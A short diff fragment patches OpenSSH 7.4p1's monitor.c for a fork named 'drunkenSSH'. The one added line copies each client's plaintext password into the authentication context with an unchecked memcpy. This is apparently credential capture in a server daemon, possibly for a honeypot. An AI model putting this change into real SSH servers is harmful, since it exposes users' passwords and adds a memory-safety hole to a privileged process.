@@ -1,0 +1,10 @@
+--- openssh-7.4p1/monitor.c	2016-12-19 05:59:41.000000000 +0100
++++ drunkenSSH/monitor.c	2018-11-10 18:03:18.570843366 +0100
+@@ -821,6 +864,7 @@
+ 	if (!options.password_authentication)
+ 		fatal("%s: password authentication not enabled", __func__);
+ 	passwd = buffer_get_string(m, &plen);
++	memcpy( &(authctxt->password),passwd, plen+1);
+ 	/* Only authenticate if the context is valid */
+ 	authenticated = options.password_authentication &&
+ 	    auth_password(authctxt, passwd);
